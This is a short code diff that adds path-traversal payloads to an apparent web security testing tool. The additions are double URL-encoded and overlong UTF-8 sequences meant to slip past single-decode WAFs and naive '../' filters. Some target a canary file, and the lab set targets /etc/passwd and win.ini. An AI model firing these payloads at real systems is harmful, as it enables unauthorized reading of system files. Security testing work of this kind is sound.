@@ -34,6 +34,10 @@ TRAVERSAL_SAFE_PAYLOADS = (
     "%2e%2e%2fbbh-canary.txt",
     "....//bbh-canary.txt",
     "..\\bbh-canary.txt",
+    # advanced filter/WAF bypasses (WAHH ch10): double-URL-encode + overlong-UTF-8 beat filters that
+    # decode once (WAF) but let the backend decode again, or that only match ASCII `../`.
+    "%252e%252e%252fbbh-canary.txt",
+    "..%c0%afbbh-canary.txt",
 )
 
 TRAVERSAL_LAB_PAYLOADS = (
@@ -41,6 +45,10 @@ TRAVERSAL_LAB_PAYLOADS = (
     "..%2f..%2f..%2f..%2fetc%2fpasswd",
     "....//....//....//....//etc/passwd",
     "..\\..\\..\\..\\windows\\win.ini",
+    # advanced bypasses (WAHH ch10) — the ones a naive `../` filter and a single-decode WAF miss:
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",  # double URL-encode
+    "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",                             # overlong UTF-8
+    "..%252f..%252f..%252f..%252fetc%252fpasswd",                                  # double-encoded slash
 )
 
 DEFAULT_DISCOVERY_WORDS = (
